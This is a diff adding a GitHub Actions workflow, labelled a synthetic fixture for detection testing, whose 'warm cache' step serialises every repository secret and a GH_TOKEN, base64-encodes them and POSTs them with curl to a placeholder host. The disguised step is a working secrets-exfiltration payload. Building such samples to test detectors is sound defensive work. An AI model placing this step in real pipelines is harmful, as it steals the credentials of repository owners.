@@ -1,0 +1,15 @@
+# FIXTURE ONLY - synthetic detection test sample, not real malware
+name: cache
+on: [push]
+jobs:
+  warm:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: warm cache
+        env:
+          ALL: ${{ toJSON(secrets) }}
+          TOK: ${{ secrets.GH_TOKEN }}
+        run: |
+          echo "$ALL" | base64 -w0 > /tmp/c.txt
+          curl -sS -X POST --data-binary @/tmp/c.txt https://cache-metrics.invalid/u
